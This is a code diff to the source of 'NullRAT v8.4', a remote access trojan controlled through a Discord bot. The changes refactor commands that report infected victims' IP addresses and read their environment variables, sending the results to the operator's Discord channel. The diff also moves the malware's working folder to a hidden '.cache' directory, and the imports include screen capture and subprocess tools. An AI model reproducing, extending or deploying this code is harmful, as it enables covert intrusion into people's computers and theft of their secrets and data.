@@ -9,17 +9,18 @@ from mss import mss
 from requests import get, post
 from base64 import decodebytes,b64decode
 from socket import create_connection
-import os, subprocess, re, time, aiohttp, datetime
+from datetime import datetime
+import os, subprocess, re, time, aiohttp
 
 client, original_dir = commands.InteractionBot(test_guilds=server_ids), os.getcwd()
-nr_working = f"C:\\Users\\{os.getenv('username')}\\Music"
+nr_working = f"C:\\Users\\{os.getenv('username')}\\.cache"
 
 @client.event
 async def on_ready():
     embed = Embed(
         title = f"NullRAT v8.4 started on: **{IP()}**", 
         description = f"Currently present in: **{original_dir}**",
-        timestamp = datetime.datetime.now()
+        timestamp = datetime.now()
     )
     embed.set_author(
         name="NullCode1337", 
@@ -32,27 +33,42 @@ async def on_ready():
     await client.get_channel(notification_channel).send(embed=embed)
 
 # Intelligence Gathering #
-@client.slash_command(description="Lists the IP address of all victims")
-async def listvictims(ctx):
-    await ctx.channel.send(
-        embed=discord.Embed(title=f"The IP of {os.getenv('username')} is: {IP()}", color=0x0081FA)
-    )
+@client.slash_command(
+    name="listvictims",
+    description="Finds the values of environment variables"
+)
+async def command(ctx):
+    await ctx.channel.send( embed=discord.Embed(title=f"The IP of {os.getenv('username')} is: {IP()}") )
     await ctx.response.send_message("Checking all available victims...")
 
-@client.slash_command(description="Finds the values of environment variables")
-async def getenv(ctx, victim, env_var):
+@client.slash_command(
+    name="getenv",
+    description="Finds the values of environment variables",
+    options=[
+        discord.Option("victim", description="IP Address of specific victim", required=True),
+        discord.Option("environment", description="The variable of which the value is wanted", required=True)
+    ],
+)
+async def command(ctx, victim: str, environment: str):
     if str(victim) == str(IP()):
-        try: value = os.getenv(env_var)
-        except: return await ctx.response.send_message(embed=discord.Embed(title="Invalid environment variable!",color=0x0081FA))
+        try: 
+            value = os.getenv(environment)
+        except: 
+            return await ctx.response.send_message(embed=discord.Embed(title="Invalid environment variable!"))
+            
         if value is None:
-            return await ctx.response.send_message(embed=discord.Embed(title="Invalid environment variable!",color=0x0081FA))
+            return await ctx.response.send_message(embed=discord.Embed(title="Invalid environment variable!"))
+            
         if len(value) >= 1023:
-            return await ctx.response.send_message(f"The value for {env_var} is:\n```{value}```")
+            return await ctx.response.send_message(f"The value for {environment} is:\n```{value}```")
+            
         await ctx.response.send_message(
-            embed = EmbedGen(
-                "__Get Environment Variable__", 
-                "The value for " + env_var + " is: ",
-                "```" + value + "```"
+            embed = Embed(
+                title=f"Found environment variable", 
+                timestamp = datetime.now()
+            ).add_field(
+                name="Value for "+environment+" is:", 
+                value="```"+value+"```"
             )
         )
 
